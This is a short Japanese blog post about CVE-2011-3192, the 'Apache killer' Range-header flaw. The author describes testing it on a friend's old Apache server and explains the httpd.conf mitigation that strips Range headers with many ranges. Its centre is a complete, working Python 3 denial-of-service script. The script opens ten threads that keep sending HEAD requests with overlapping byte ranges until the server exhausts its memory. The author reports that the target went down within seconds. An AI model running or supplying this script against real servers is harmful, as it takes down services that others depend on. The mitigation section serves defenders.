---
title: pythonでapache killerを書いてみる
pubtime: 2015-07-01T15:25:00+09:00
tags: [Web, Apache, Python, セキュリティ]
description: 友人のサーバの脆弱性を調べていたらapacheのバージョンが古かったので、試しにapache killerと言われる攻撃手法を試してみました。
---

友人の自宅サーバの脆弱性検査をしていたら、apacheのバージョンが随分と古かったのでapache killer(CVE-2011-3192)をさくっと叩いてみました。
ツール起動して十数秒でダウンするという恐ろしさ。

この脆弱性を持っているのはApache 2.2.19以前と、2.0.64以前らしいです。

**httpd.conf**に以下のような設定を付け足すと大丈夫になるようです。
``` apache
# Drop the Range header when more than 5 ranges.
# CVE-2011-3192
SetEnvIf Range (?:,.*?){5,5} bad-range=1
RequestHeader unset Range env=bad-range

# We always drop Request-Range; as this is a legacy
# dating back to MSIE3 and Netscape 2 and 3.
RequestHeader unset Request-Range
```
[参考サイト](http://blog.tokumaru.org/2011/08/apache-killerapache-killer.html)に載っていたのそのままなのでコメント入ってますけど、結局のところ三行。シンプルだね。

さて、本題。
攻撃用に書いたコードがこんな感じです。python3。
``` python
import socket
import threading


target = ''  # target host name. eg. 'example.com'


dat = '''HEAD / HTTP/1.1
Host: {}
Range: bytes=0-1,1-2,2-3,3-4,4-5,5-6,6-7,7-8,8-9,9-10,10-11,11-12,12-13,13-14,0-1
Accept-Encoding: gzip
Connection: keep-alive


'''.format(target).encode('ascii')


def attack():
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target, 80))

        while True:
            sock.send(dat)
            if sock.recv(1024) == b'':
                break


if __name__ == '__main__':
    for i in range(10):
        t = threading.Thread(target=attack).run()
```
ご覧いただくとお分かり頂けるように、Rangeヘッダになんか凄い値が入っています。
0バイト目から1バイト目、1バイト目から2バイト目、2バイト目から・・・みたいな指定の仕方。
こういった感じでRangeヘッダで分割しまくると、メモリを物凄く食ってしまうそうです。

このコードではkeep-aliveを指定したコネクションを張るスレッドを10個立てて、件のリクエストを送り続けます。
アクセスログ見てるとかなり面白い。

そんなわけで。もう一度対策の設定を見てみる。
``` apache
SetEnvIf Range (?:,.*?){5,5} bad-range=1  # Rangeヘッダに,がいっぱいある場合はbad-rangeに1を設定
RequestHeader unset Range env=bad-range  # bad-rangeが設定されているなら、Rangeヘッダを削除。
```
こんな感じか。なるほど。

``` apache
RequestHeader unset Request-Range
```
こっちの意味はよく分からんのですが、コメントを見る限りでは古いブラウザの一部がこのヘッダを指定してくる、ということなのかな？

余談ですが、サーバのバージョンは必ず隠そうね。どういう脆弱性があるかを推察されてしまう。

---

参考：
- [Apache killerは危険&#65374;Apache killerを評価する上での注意&#65374; | 徳丸浩の日記](http://blog.tokumaru.org/2011/08/apache-killerapache-killer.html)
- [Here's a Preliminary "Apache Killer" Test Script - Blogging Techstacks](http://blog.techstacks.com/2011/08/heres-a-preliminary-apache-killer-test-script.html)
